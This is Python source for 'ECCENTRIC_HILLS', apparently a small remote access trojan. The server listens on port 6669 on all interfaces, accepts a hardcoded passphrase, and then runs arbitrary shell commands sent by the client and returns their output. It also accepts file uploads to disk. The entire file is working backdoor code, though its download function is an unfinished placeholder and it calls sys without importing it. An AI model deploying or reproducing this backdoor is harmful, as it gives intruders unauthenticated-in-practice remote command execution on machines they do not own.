"""
ECCENTRIC_HILLS - *NIX Server Deployment Binary
Written by Gunnar Jones - @gunSec and Austin Crinkaw - @acrinklaw
https://github.com/gunSec/eccentric_hills
"""
#grabbing our libraries
import socket
import threading
import os
import subprocess
import re
#grab some easy system info to pass to client upon connection

#Set server to accept connections from any interface, port 6669
BINDIP = "0.0.0.0"
BINDPORT = 6669
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((BINDIP,BINDPORT))

IP = subprocess.check_output("ip a",stderr=subprocess.
STDOUT, shell=True)
IP = str(re.findall( r'[0-9]+(?:.[0-9]+){3}', IP)[2])

#server can handle up to 3 concurrent sessions
server.listen(3)

"""
Writes data from client to server current directory
"""
def upload(client_socket):
    with open("./file", 'wb') as oh:
        data = client_socket.recv(1024)
        while data:
            oh.write(data)
            data = client_socket.recv(1024)


def download(client_socket):
    i = 2 #Placeholder
#client -> server
    #TODO THIS

"""
Method to handle parsing and execution of shell commands
"""
def commands(command, client_socket):
    command = command.rstrip()
    #Debug statement
    if command == "":
        return command
    elif command[0] != "!":
        try:
            result =  subprocess.check_output(command,stderr=subprocess.
                                                STDOUT, shell=True)
            result = "\n" + result
            return result
        except:
            result = "\nCommand Indicated Failure.\n"
            return result
    elif command[0] == "!":
        command = command[1:]
        if command == "upload":
            #TODO WORK ON UPLOAD
            upload(client_socket)
        elif command == 'download':
            download(client_socket)
    else:
        sys.exit(1)

"""
Provides main server functions, sends client response to shell commands
"""
def shell(client_socket):
    while True:
        client_socket.send("\nECHI %s> !!"%IP)
        buffer = ""
        while "\n" not in buffer:
            buffer += client_socket.recv(1024)
        if "quit" in buffer:
            client_socket.close()
            break
        else:
            response = commands(buffer, client_socket)
            try:
                client_socket.send(response)
            except:
                continue

"""
Client handler, require predetermined hash or passphrase to establish connection
"""
def handle_client(client_socket):
    hashpass = client_socket.recv(1024)
    if hashpass == 'gunclawpythonratniBBa':
        #send the w and uname to client, jump to shell loop
        client_socket.send("\n[+] Accepted Connection\n")
        shell(client_socket)
    else:
        client_socket.close()


def main():
    while True:
        client,addr = server.accept()
        client_handler = threading.Thread(target=handle_client,args=(client,))
        client_handler.start()


if __name__ == '__main__':
    main()
